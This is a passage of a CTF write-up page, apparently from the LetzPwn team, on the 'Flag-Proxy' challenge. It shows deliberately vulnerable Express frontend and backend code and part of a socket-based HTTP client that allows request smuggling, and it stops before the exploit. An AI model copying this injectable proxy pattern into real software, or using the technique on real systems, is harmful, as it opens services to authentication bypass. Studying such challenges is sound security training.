@@ -1,0 +1,840 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <!-- title will be injected from _config.yml -->
+  <!-- Stylesheets -->
+  
+  <link rel="stylesheet" href="/assets/css/bootstrap.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/responsive.css">
+  <link rel="stylesheet" href="/assets/css/import_custom.css">
+
+  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+
+  <!-- Responsive -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Flag-Proxy | LetzPwn - Luxembourgish CTF Team</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Flag-Proxy" />
+<meta name="author" content="Jaak W." />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description I just added authentication to my flag service (server-back) thanks to a proxy (server-front), but a friend said it’s useless… Site: http://flag-proxy.challs.teamitaly.eu" />
+<meta property="og:description" content="Description I just added authentication to my flag service (server-back) thanks to a proxy (server-front), but a friend said it’s useless… Site: http://flag-proxy.challs.teamitaly.eu" />
+<link rel="canonical" href="/writeup/2022/09/08/Flag-Proxy.html" />
+<meta property="og:url" content="/writeup/2022/09/08/Flag-Proxy.html" />
+<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
+<meta property="og:image" content="/img/website.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-09-08T23:10:05+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/img/website.png" />
+<meta property="twitter:title" content="Flag-Proxy" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Jaak W."},"dateModified":"2022-09-08T23:10:05+00:00","datePublished":"2022-09-08T23:10:05+00:00","description":"Description I just added authentication to my flag service (server-back) thanks to a proxy (server-front), but a friend said it’s useless… Site: http://flag-proxy.challs.teamitaly.eu","headline":"Flag-Proxy","image":"/img/website.png","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2022/09/08/Flag-Proxy.html"},"url":"/writeup/2022/09/08/Flag-Proxy.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
+  <div class="page-wrapper"><!-- Main Header -->
+<header class="main-header">
+  <!-- Header Top -->
+  <div class="header-top">
+    <div class="auto-container clearfix">
+
+      <div class="top-left clearfix">
+        <ul class="info-list">
+          <li>The first Luxembourgish CTF Team</li>
+        </ul>
+      </div>
+
+      <div class="top-right">
+        <ul class="social-icons">
+          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Upper -->
+  <div class="header-upper">
+    <div class="inner-container">
+      <div class="auto-container clearfix">
+        <!--Logo-->
+        <div class="logo-outer">
+          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
+                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
+        </div>
+
+        <!--Nav Box-->
+        <div class="nav-outer clearfix">
+          <!--Mobile Navigation Toggler-->
+          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>
+
+          <!-- Main Menu -->
+          <nav class="main-menu navbar-expand-md navbar-light">
+            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
+              <ul class="navigation clearfix pull-left">
+                
+                
+                <li class=""><a href="/">Home</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/about_us.html">About Us</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/events.html">News & CTFs</a>
+                </li>
+                
+                
+              </ul>
+
+                <ul class="navigation clearfix pull-right">
+                  
+                    
+                    <li class=""><a href="/sponsors.html">Sponsors</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/writeups.html">Writeups</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/contact.html">Contact</a> </li>
+                    
+                  
+                </ul>
+            </div>
+          </nav>
+          <!-- Main Menu End-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--End Header Upper-->
+
+  <!-- Sticky Header  -->
+  <div class="sticky-header">
+    <div class="auto-container clearfix">
+      <!--Logo-->
+      <div class="logo pull-left">
+        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
+      </div>
+      <!--Right Col-->
+      <div class="pull-right">
+        <!-- Main Menu -->
+        <nav class="main-menu clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </nav><!-- Main Menu End-->
+      </div>
+    </div>
+  </div><!-- End Sticky Menu -->
+
+  <!-- Mobile Menu  -->
+  <div class="mobile-menu">
+    <div class="menu-backdrop"></div>
+    <div class="close-btn"><span class="icon flaticon-close"></span></div>
+
+    <nav class="menu-box">
+      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
+      <div class="menu-outer">
+        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      </div>
+      <!--Social Links--
+      <div class="social-links">
+        <ul class="clearfix">
+          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
+        </ul>
+      </div>-->
+    </nav>
+  </div><!-- End Mobile Menu -->
+</header>
+<!--Page Title-->
+<div itemscope itemtype="http://schema.org/BlogPosting">
+  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
+    <div class="auto-container">
+      <div class="inner-container clearfix">
+        <ul class="bread-crumb clearfix">
+          <li><a href="/index.html">Home</a></li> 
+          <li><a href="/writeups.html">Writeups</a></li>
+          <li><a href="#">TeamItalyCTF 2022</a></li> <!-- TODO: correct href-->
+          <li itemprop="name headline">Flag-Proxy Writeup</li>
+        </ul>
+        <h1>Flag-Proxy Writeup</h1><ul class="custom-author">
+                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
+                      class="p-author h-card" itemprop="name">Jaak W.</span></span>
+                </li>
+              </ul>
+              <br/><div class="custom-date">Sep 8, 2022</div>
+        <ul class="tags">
+          <li>Solves: 41/786 teams</li>
+          <li>Source: <a href="Team Italy CTF" target="_blank" rel="noopener noreferrer">Team Italy CTF</a></li>
+        </ul>
+    </div>
+  </section>
+  <!--End Page Title-->
+
+  <!--Sidebar Page Container-->
+  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
+    <div class="auto-container">
+      <div class="row clearfix">
+
+        <!--Content Side / Blog Detail-->
+        <div class="content-side col-lg-8 col-md-12 col-sm-12">
+          <div class="blog-detail">
+            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
+              <p> <h2 id="description">Description</h2>
+<blockquote>
+  <p>I just added authentication to my flag service (server-back) thanks to a proxy (server-front), but a friend said it’s useless…
+Site: http://flag-proxy.challs.teamitaly.eu</p>
+</blockquote>
+
+<h2 id="tldr">TL;DR</h2>
+
+<p>Request Smuggling vulnerability in a proxy server using sockets to send http requests to backend.</p>
+
+<h2 id="complete-writeup">Complete Writeup</h2>
+
+<p>We receive a <code class="language-plaintext highlighter-rouge">flag-proxy.zip</code> that unzips to the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|-- server-back
+|   |-- Dockerfile
+|   |-- index.js
+|   |-- package.json
+|   `-- package-lock.json
+|-- server-front
+|   |-- Dockerfile
+|   |-- http-client.js
+|   |-- index.js
+|   |-- package.json
+|   `-- package-lock.json
+|-- docker-compose.yml
+</code></pre></div></div>
+
+<p>Let’s look at the <strong>frontend</strong> index.js first:</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="dl">'</span><span class="s1">dotenv/config</span><span class="dl">'</span><span class="p">;</span>
+<span class="k">import</span> <span class="nx">express</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span> <span class="nx">request</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">./http-client.js</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">data</span> <span class="o">+=</span> <span class="nx">chunk</span><span class="p">;</span>
+  <span class="p">});</span>
+
+  <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">end</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
+    <span class="nf">next</span><span class="p">();</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Missing token</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nf">request</span><span class="p">(</span><span class="s2">`http://</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BACK</span><span class="p">}</span><span class="s2">:8080/flag`</span><span class="p">,</span> <span class="p">{</span><span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span><span class="na">headers</span><span class="p">:</span> <span class="p">{</span><span class="na">Authorization</span><span class="p">:</span> <span class="s2">`Bearer </span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">}</span><span class="s2">`</span><span class="p">,},})</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">There has been an error with the request</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/add-token</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Missing token</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">auth</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">auth</span> <span class="o">!==</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">AUTH</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Wrong auth</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="nf">request</span><span class="p">(</span>
+    <span class="s2">`http://</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BACK</span><span class="p">}</span><span class="s2">:8080/add-token?token=</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span>
+    <span class="p">{</span>
+      <span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span>
+    <span class="p">}</span>
+  <span class="p">)</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">There has been an error with the request</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Listening on port 1337!</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>The <strong>backend</strong> index.js looks as follows:</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="dl">'</span><span class="s1">dotenv/config</span><span class="dl">'</span><span class="p">;</span>
+<span class="k">import</span> <span class="nx">express</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">((</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">data</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">chunk</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">data</span> <span class="o">+=</span> <span class="nx">chunk</span><span class="p">;</span>
+  <span class="p">});</span>
+
+  <span class="nx">req</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">end</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">req</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">data</span><span class="p">;</span>
+    <span class="nf">next</span><span class="p">();</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="kd">const</span> <span class="nx">tokens</span> <span class="o">=</span> <span class="p">[];</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/flag</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">[</span><span class="dl">'</span><span class="s1">authorization</span><span class="dl">'</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1"> </span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">tokens</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">token</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Invalid token</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/add-token</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">?.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Token too short</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">tokens</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">OK</span><span class="dl">'</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">8080</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Listening on port 8080!</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>So, let’s summarize the most important bits:</p>
+
+<p>First of all, the frontend implements an http client (<code class="language-plaintext highlighter-rouge">http-client.js</code>) using sockets instead of using a library. That already seems like a bad idea. But let’s first look at what the rest of the code does (just note that the <code class="language-plaintext highlighter-rouge">request()</code> function in the frontend is from this http client).</p>
+
+<p>The frontend as well as the backend implement two <code class="language-plaintext highlighter-rouge">GET</code> endpoints each:</p>
+<ul>
+  <li>frontend:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">/flag</code> expecting a <code class="language-plaintext highlighter-rouge">token</code> parameter
+        <ul>
+          <li>the <code class="language-plaintext highlighter-rouge">token</code> is sent to the backend as follows:
+  <code class="language-plaintext highlighter-rouge">request('http://${process.env.BACK}:8080/flag', {method: 'GET',headers:{Authorization: 'Bearer ${req.query.token}',},})</code></li>
+        </ul>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">/add-token</code> expecting a <code class="language-plaintext highlighter-rouge">token</code> and an <code class="language-plaintext highlighter-rouge">auth</code> parameter
+        <ul>
+          <li>the <code class="language-plaintext highlighter-rouge">auth</code> parameter is checked against an environment variable <code class="language-plaintext highlighter-rouge">process.env.AUTH</code> that is (obviously) redacted in the .yaml file</li>
+          <li>if the auth check is passed, the <code class="language-plaintext highlighter-rouge">token</code> is sent to the backend as follows:
+  <code class="language-plaintext highlighter-rouge">request('http://${process.env.BACK}:8080/add-token?token=${req.query.token}'',{method: 'GET',})</code></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>backend
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">/flag</code> expecting a <code class="language-plaintext highlighter-rouge">token</code> parameter
+        <ul>
+          <li>If the provided token is in a list of saved tokens, the flag is sent back</li>
+        </ul>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">/add-token</code> expecting a <code class="language-plaintext highlighter-rouge">token</code> parameter
+        <ul>
+          <li>The provided token is added to the list of saved tokens</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>So basically as a user…</p>
+<ul>
+  <li>one can communicate with the backend <code class="language-plaintext highlighter-rouge">/flag</code> through the frontend <code class="language-plaintext highlighter-rouge">/flag</code> endpoint, where the backend checks if the provided (access) token is one from its list.</li>
+  <li>one can communicate with the backend <code class="language-plaintext highlighter-rouge">/add-token</code> through the frontend <code class="language-plaintext highlighter-rouge">/add-token</code> endpoint, where the frontend checks if the provided auth parameter is matching a hidden value.</li>
+</ul>
+
+<p>Both ways seem blocked. I have thought about bypassing them but since we have a very sus socket http-client, let’s see what that does:</p>
+
+<div class="language-typescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="p">{</span> <span class="nx">Socket</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">net</span><span class="dl">'</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">splitWithTail</span> <span class="o">=</span> <span class="p">(</span><span class="nx">str</span><span class="p">,</span> <span class="nx">delim</span><span class="p">,</span> <span class="nx">count</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">parts</span> <span class="o">=</span> <span class="nx">str</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="nx">delim</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">tail</span> <span class="o">=</span> <span class="nx">parts</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="nx">count</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="nx">delim</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">parts</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">count</span><span class="p">);</span>
+  <span class="nx">result</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">tail</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">parseResponse</span> <span class="o">=</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">headers</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">head</span><span class="p">,</span> <span class="nx">body</span><span class="p">]</span> <span class="o">=</span> <span class="nx">response</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n\r\n</span><span class="dl">'</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">statusLine</span><span class="p">,</span> <span class="p">...</span><span class="nx">headerLines</span><span class="p">]</span> <span class="o">=</span> <span class="nx">head</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">httpVersion</span><span class="p">,</span> <span class="nx">statusCodeString</span><span class="p">,</span> <span class="nx">statusMessage</span><span class="p">]</span> <span class="o">=</span> <span class="nf">splitWithTail</span><span class="p">(</span><span class="nx">statusLine</span><span class="p">,</span> <span class="dl">'</span><span class="s1"> </span><span class="dl">'</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+  <span class="kd">const</span> <span class="nx">statusCode</span> <span class="o">=</span> <span class="nf">parseInt</span><span class="p">(</span><span class="nx">statusCodeString</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+  <span class="nx">headerLines</span><span class="p">.</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">line</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="p">[</span><span class="nx">key</span><span class="p">,</span> <span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">line</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">: </span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">headers</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+  <span class="p">});</span>
+  <span class="k">return</span> <span class="p">{</span>
+    <span class="nx">httpVersion</span><span class="p">,</span>
+    <span class="nx">statusCode</span><span class="p">,</span>
+    <span class="nx">statusMessage</span><span class="p">,</span>
+    <span class="nx">headers</span><span class="p">,</span>
+    <span class="nx">body</span>
+  <span class="p">};</span>
+<span class="p">};</span>
+
+<span class="k">export</span> <span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="k">async </span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">options</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">parsedUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+
+  <span class="kd">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Socket</span><span class="p">();</span>
+  <span class="nx">client</span><span class="p">.</span><span class="nf">setEncoding</span><span class="p">(</span><span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">client</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">port</span> <span class="o">||</span> <span class="mi">80</span><span class="p">,</span> <span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">hostname</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+
+    <span class="kd">let</span> <span class="nx">request</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">options</span><span class="p">.</span><span class="nx">method</span><span class="p">}</span><span class="s2"> </span><span class="p">${</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">+</span> <span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">search</span><span class="p">}</span><span class="s2"> HTTP/1.0\r\n`</span><span class="p">;</span>
+    <span class="nx">request</span> <span class="o">+=</span> <span class="s2">`Host: </span><span class="p">${</span><span class="nx">parsedUrl</span><span class="p">.</span><span class="nx">host</span><span class="p">}</span><span class="s2">\r\n`</span><span class="p">;</span>
